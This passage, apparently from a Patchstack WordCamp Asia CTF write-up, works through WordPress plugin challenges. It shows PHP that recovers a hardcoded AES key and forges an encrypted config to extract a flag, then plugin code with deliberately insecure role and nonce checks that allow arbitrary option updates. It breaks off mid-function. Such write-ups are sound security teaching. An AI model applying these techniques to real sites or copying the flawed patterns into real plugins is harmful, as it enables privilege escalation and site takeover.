+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-9.png width=1548 height=533 loading=lazy class=gallery-image data-flex-grow=290 data-flex-basis=697px></p><p>We can decode the base64 data to obtain the encryption key</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$decoded</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=s2>&#34;MWEwNDY1YWQtMTFkMy00NG3dDSyMtvZuU+aUR3m+mhbmL97Xms5PKdE68WEwW3Qm54qJ9mGDY4Ar39kDk23WXzu5T7MZ/RKX2bdbRO7jcbp1ALhvPEpVM2LAM0a6y+cnM7bok0/lA2APiaurEdz4eH6xddsf6RQ/AeO9QNCZI/1iQC1rpGJyA40KmhIwl6Vg&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$uuid</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$decoded</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$enc</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$decoded</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;KEY &amp; IV: &#34;</span> <span class=o>.</span> <span class=nv>$uuid</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$decrypted</span> <span class=o>=</span> <span class=nx>openssl_decrypt</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$enc</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;AES-256-CBC&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;1a0465ad-11d3-44&#34;</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>                <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s2>&#34;1a0465ad-11d3-44&#34;</span>
+</span></span><span class=line><span class=cl>            <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;Decrypted: &#34;</span> <span class=o>.</span> <span class=nv>$decrypted</span> <span class=o>.</span> <span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-10.png width=1091 height=545 loading=lazy class=gallery-image data-flex-grow=200 data-flex-basis=480px></p><p>Here we found the full encryption_key. This will be handy later on.</p><p>Now let&rsquo;s analyze the third ajax, <code>handle_settings_request</code>.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span><span class=lnt>36
+</span><span class=lnt>37
+</span><span class=lnt>38
+</span><span class=lnt>39
+</span><span class=lnt>40
+</span><span class=lnt>41
+</span><span class=lnt>42
+</span><span class=lnt>43
+</span><span class=lnt>44
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>handle_settings_request</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$data</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;php://input&#39;</span><span class=p>),</span> <span class=k>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>isset</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;config&#39;</span><span class=p>]))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;Missing config&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    
+</span></span><span class=line><span class=cl>    <span class=k>try</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$decoded</span> <span class=o>=</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$data</span><span class=p>[</span><span class=s1>&#39;config&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$uuid</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$decoded</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$encrypted</span> <span class=o>=</span> <span class=nx>substr</span><span class=p>(</span><span class=nv>$decoded</span><span class=p>,</span> <span class=mi>16</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=nv>$decrypted</span> <span class=o>=</span> <span class=nx>openssl_decrypt</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$encrypted</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;AES-256-CBC&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>encryption_key</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=mi>0</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$uuid</span>
+</span></span><span class=line><span class=cl>        <span class=p>);</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=nv>$config</span> <span class=o>=</span> <span class=nx>json_decode</span><span class=p>(</span><span class=nv>$decrypted</span><span class=p>,</span> <span class=k>true</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nv>$config</span> <span class=o>&amp;&amp;</span> 
+</span></span><span class=line><span class=cl>            <span class=nx>isset</span><span class=p>(</span><span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;status&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> 
+</span></span><span class=line><span class=cl>            <span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;status&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=s1>&#39;publish&#39;</span> <span class=o>&amp;&amp;</span> 
+</span></span><span class=line><span class=cl>            <span class=nx>isset</span><span class=p>(</span><span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;permissions&#39;</span><span class=p>][</span><span class=s1>&#39;all&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span> 
+</span></span><span class=line><span class=cl>            <span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;permissions&#39;</span><span class=p>][</span><span class=s1>&#39;all&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=k>true</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=nx>isset</span><span class=p>(</span><span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;flag_access&#39;</span><span class=p>])</span> <span class=o>&amp;&amp;</span>
+</span></span><span class=line><span class=cl>            <span class=nv>$config</span><span class=p>[</span><span class=s1>&#39;flag_access&#39;</span><span class=p>]</span> <span class=o>===</span> <span class=k>true</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>                <span class=nv>$flag</span> <span class=o>=</span> <span class=o>@</span><span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag.txt&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>                <span class=nx>wp_send_json_success</span><span class=p>(</span><span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                    <span class=s1>&#39;message&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Configuration updated&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                    <span class=s1>&#39;flag&#39;</span> <span class=o>=&gt;</span> <span class=nx>trim</span><span class=p>(</span><span class=nv>$flag</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>                <span class=p>));</span>
+</span></span><span class=line><span class=cl>                <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>        <span class=p>}</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_success</span><span class=p>(</span><span class=k>array</span><span class=p>(</span><span class=s1>&#39;message&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Configuration updated&#39;</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>        
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>catch</span> <span class=p>(</span><span class=nx>Exception</span> <span class=nv>$e</span><span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s1>&#39;Invalid configuration&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>It will read JSON body, then check if base64 encoded config data is match with the validation. Note that this time the config is decrypted using <code>encryption_key</code>. Since we already know the full value of <code>encryption_key</code>, then we can also craft the correct config format to read the flag.</p><p>Below is the script used to craft the correct config data.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nv>$key</span> <span class=o>=</span> <span class=s2>&#34;1a0465ad-11d3-440c-9b80-42d429652c9c&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=nv>$uuid</span> <span class=o>=</span> <span class=s2>&#34;1a0465ad-11d3-44&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$enkrip</span> <span class=o>=</span> <span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;status&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;publish&#34;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;permissions&#34;</span> <span class=o>=&gt;</span> <span class=k>array</span><span class=p>(</span><span class=s2>&#34;all&#34;</span> <span class=o>=&gt;</span> <span class=k>true</span><span class=p>),</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;flag_access&#34;</span> <span class=o>=&gt;</span> <span class=k>true</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>    <span class=s2>&#34;encryption_key&#34;</span> <span class=o>=&gt;</span> <span class=s2>&#34;1a0465ad-11d3-440c-9b80-42d429652c9c&#34;</span>
+</span></span><span class=line><span class=cl><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$enkrip</span> <span class=o>=</span> <span class=nx>json_encode</span><span class=p>(</span><span class=nv>$enkrip</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$encrypted</span> <span class=o>=</span> <span class=nx>openssl_encrypt</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>                <span class=nv>$enkrip</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=s1>&#39;AES-256-CBC&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>                <span class=nv>$key</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>                <span class=mi>0</span><span class=p>,</span> 
+</span></span><span class=line><span class=cl>                <span class=nv>$uuid</span>
+</span></span><span class=line><span class=cl>            <span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nv>$final</span> <span class=o>=</span> <span class=nv>$uuid</span> <span class=o>.</span> <span class=nx>base64_decode</span><span class=p>(</span><span class=nv>$encrypted</span><span class=p>);</span>
+</span></span><span class=line><span class=cl><span class=nv>$encoded</span> <span class=o>=</span> <span class=nx>base64_encode</span><span class=p>(</span><span class=nv>$final</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>echo</span> <span class=s2>&#34;Encrypted: &#34;</span> <span class=o>.</span> <span class=nv>$encoded</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-11.png width=957 height=699 loading=lazy class=gallery-image data-flex-grow=136 data-flex-basis=328px></p><p>Flag Obtained!
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-12.png width=1549 height=508 loading=lazy class=gallery-image data-flex-grow=304 data-flex-basis=731px></p><p><strong>Flag: CTF{crypt0_aint_crypt0ing_patchstack2o25}</strong></p><hr><h3 id=sup3rcustomiz3r>Sup3rcustomiz3r</h3><blockquote><p>My friend is developing a cool plugin to help me customize my Login page, isn&rsquo;t that nice? So many stuff and options, I&rsquo;m sure it&rsquo;s 100% safe to use&mldr;</p><p>This is a whitebox challenge, no need to bruteforce anything (login, endpoint, etc).</p></blockquote><p>in the given challenge file, we can observe that it only uses one plugin called <code>login-customizer</code>
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-13.png width=678 height=205 loading=lazy class=gallery-image data-flex-grow=330 data-flex-basis=793px></p><p>There were several ajax action in the plugins.</p><p><img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-14.png width=675 height=572 loading=lazy class=gallery-image data-flex-grow=118 data-flex-basis=283px></p><p>Let&rsquo;s try to analyze the unauthenticated ajax. <code>patchstack_get_the_flag</code> action will try to sent a flag if we logged in with any of the whitelisted roles (administrator, author, contributor)</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>get_the_flag</span><span class=p>()</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$user</span> <span class=o>=</span> <span class=nx>wp_get_current_user</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$allowed_roles</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;administrator&#34;</span><span class=p>,</span> <span class=s2>&#34;author&#34;</span><span class=p>,</span> <span class=s2>&#34;contributor&#34;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>array_intersect</span><span class=p>(</span><span class=nv>$allowed_roles</span><span class=p>,</span> <span class=nv>$user</span><span class=o>-&gt;</span><span class=na>roles</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$value</span> <span class=o>=</span> <span class=nx>file_get_contents</span><span class=p>(</span><span class=s1>&#39;/flag.txt&#39;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_success</span><span class=p>([</span><span class=s2>&#34;value&#34;</span> <span class=o>=&gt;</span> <span class=nv>$value</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=s2>&#34;Unauthorized&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>login_register_user</code> action allow us to register in the site, and then set the <code>default_role</code> to <code>subscriber</code>. Note that the registration role is not set within <code>wp_create_user</code> function. In this case, then it will use role defined in <code>default_role</code> option value.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span><span class=lnt>28
+</span><span class=lnt>29
+</span><span class=lnt>30
+</span><span class=lnt>31
+</span><span class=lnt>32
+</span><span class=lnt>33
+</span><span class=lnt>34
+</span><span class=lnt>35
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>login_register_user</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$username</span> <span class=o>=</span> <span class=nx>sanitize_user</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;username&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$email</span> <span class=o>=</span> <span class=nx>sanitize_email</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;email&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>    <span class=nv>$password</span> <span class=o>=</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;password&#39;</span><span class=p>];</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=k>empty</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span> <span class=o>||</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$email</span><span class=p>)</span> <span class=o>||</span> <span class=k>empty</span><span class=p>(</span><span class=nv>$password</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;message&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;All fields (username, email, password) are required.&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=o>!</span><span class=nx>is_email</span><span class=p>(</span><span class=nv>$email</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;message&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Invalid email address.&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>username_exists</span><span class=p>(</span><span class=nv>$username</span><span class=p>)</span> <span class=o>||</span> <span class=nx>email_exists</span><span class=p>(</span><span class=nv>$email</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;message&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;Username or email already exists.&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nv>$user_id</span> <span class=o>=</span> <span class=nx>wp_create_user</span><span class=p>(</span><span class=nv>$username</span><span class=p>,</span> <span class=nv>$password</span><span class=p>,</span> <span class=nv>$email</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=nx>update_option</span><span class=p>(</span><span class=s2>&#34;default_role&#34;</span><span class=p>,</span> <span class=s2>&#34;subscriber&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=nx>is_wp_error</span><span class=p>(</span><span class=nv>$user_id</span><span class=p>))</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_error</span><span class=p>(</span><span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>            <span class=s1>&#39;message&#39;</span> <span class=o>=&gt;</span> <span class=nv>$user_id</span><span class=o>-&gt;</span><span class=na>get_error_message</span><span class=p>(),</span>
+</span></span><span class=line><span class=cl>        <span class=p>));</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nx>wp_send_json_success</span><span class=p>(</span><span class=k>array</span><span class=p>(</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;message&#39;</span> <span class=o>=&gt;</span> <span class=s1>&#39;User registered successfully.&#39;</span><span class=p>,</span>
+</span></span><span class=line><span class=cl>        <span class=s1>&#39;user_id&#39;</span> <span class=o>=&gt;</span> <span class=nv>$user_id</span>
+</span></span><span class=line><span class=cl>    <span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>We also had interesting authenticated ajax action that can be used to set options
+<img src=/p/patchstack-s02e01-wordcamp-asia-ctf-writeup/image-15.png width=930 height=253 loading=lazy class=gallery-image data-flex-grow=367 data-flex-basis=882px></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>function</span> <span class=nf>set_option</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;_wpnonce&#39;</span><span class=p>]</span> <span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=nx>wp_verify_nonce</span><span class=p>(</span> <span class=nx>sanitize_text_field</span><span class=p>(</span> <span class=nx>wp_unslash</span><span class=p>(</span> <span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;_wpnonce&#39;</span><span class=p>]</span> <span class=p>)</span> <span class=p>),</span> <span class=s1>&#39;login-customizer-admin&#39;</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$op</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;option&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>        <span class=nv>$val</span> <span class=o>=</span> <span class=nx>sanitize_text_field</span><span class=p>(</span><span class=nv>$_POST</span><span class=p>[</span><span class=s1>&#39;value&#39;</span><span class=p>]);</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>        <span class=nx>update_option</span><span class=p>(</span><span class=nv>$op</span><span class=p>,</span> <span class=nv>$val</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>        <span class=nx>wp_send_json_success</span><span class=p>(</span> <span class=s1>&#39;Option has been saved&#39;</span><span class=p>,</span> <span class=mi>201</span> <span class=p>);</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>this action doesn&rsquo;t validate to user role at all. It just perform validation based on the nonce validation. So in theory, if any authenticated users able to obtain nonce value of <code>login-customizer-admin</code>, then they can access this ajax and update arbitrary wp options.</p><p>If we try to trace the nonce generation, we can found that it was generated in <code>preview_data</code> method if <code>is_preview_mode</code> method is true. <code>is_preview_mode</code> just try to search if there&rsquo;s <code>preview</code> parameter set.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>is_preview_mode</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=c1>// Check if preview page is the current page.
+</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=k>if</span> <span class=p>(</span> <span class=nx>isset</span><span class=p>(</span> <span class=nv>$_GET</span><span class=p>[</span><span class=s1>&#39;preview&#39;</span><span class=p>]</span> <span class=p>)</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>true</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=k>false</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>public</span> <span class=k>function</span> <span class=nf>preview_data</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span> <span class=o>!</span> <span class=nv>$this</span><span class=o>-&gt;</span><span class=na>is_preview_mode</span><span class=p>()</span> <span class=p>)</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>        <span class=k>return</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>    <span class=p>}</span>
